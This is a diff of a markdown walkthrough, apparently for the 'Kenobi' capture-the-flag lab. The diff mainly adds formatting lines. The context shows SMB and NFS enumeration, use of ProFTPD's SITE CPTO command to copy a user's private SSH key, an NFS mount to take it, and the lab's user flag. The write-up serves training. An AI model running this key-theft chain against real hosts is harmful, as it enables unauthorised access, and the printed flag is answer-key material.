@@ -20,6 +20,8 @@ As usual start with a nmap scan:
 ```bash
 nmap -T4 -sC -sV -Pn -oN nmap/initial 10.10.226.246
 ```
+{: .nolineno }
+
 Count number of open ports. Q2 done
 
 ## Task 2: Enumerating Samba for shares
@@ -31,6 +33,7 @@ Samba is based on the common client/server protocol of Server Message Block (SMB
 ```bash
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
 ```
+{: .nolineno }
 
 SMB has two ports, 445 and 139.
 
@@ -48,6 +51,7 @@ On most distributions of Linux smbclient is already installed. Lets inspect one 
 ```bash
 smbclient //10.10.221.220/anonymous
 ```
+{: .nolineno }
 
 Using your machine, connect to the machines network share.
 
@@ -60,6 +64,7 @@ You can recursively download the SMB share too. Submit the username and password
 ```bash
 smbget -R smb://10.10.221.220/anonymous
 ```
+{: .nolineno }
 
 Open the file on the share. There is a few interesting things found.
 
@@ -77,6 +82,7 @@ In our case, port 111 is access to a network file system. Lets use nmap to enume
 ```bash
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.221.220
 ```
+{: .nolineno }
 
 Q4. What mount can we see?
 
@@ -93,6 +99,7 @@ Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP
 ```bash
 nc 10.10.221.220 21
 ```
+{: .nolineno }
 
 Q1. What is the version?
 
@@ -124,16 +131,13 @@ SITE CPTO /var/tmp/id_rsa
 250 Copy successful
 
 ```
+{: .nolineno }
 
 Q4. We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.
 
 > "No answer needed"
 
 Lets mount the /var/tmp directory to our machine
-
-mkdir /mnt/kenobiNFS
-mount 10.10.221.220:/var /mnt/kenobiNFS
-ls -la /mnt/kenobiNFS
 
 ```bash
 └─$ sudo mkdir /mnt/kenobiNFS
@@ -157,6 +161,7 @@ drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
 drwxrwxrwt  6 root root  4096 Jan 22 14:25 tmp
 drwxr-xr-x  3 root root  4096 Sep  4  2019 www
 ```
+{: .nolineno }
 
 We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.
 
@@ -188,6 +193,7 @@ share  user.txt
 kenobi@kenobi:~$ cat user.txt
 d0b0f3f53b6caa532a83915e19224899
 ```
+{: .nolineno }
 
 Q5. What is Kenobi's user flag (/home/kenobi/user.txt)?
 
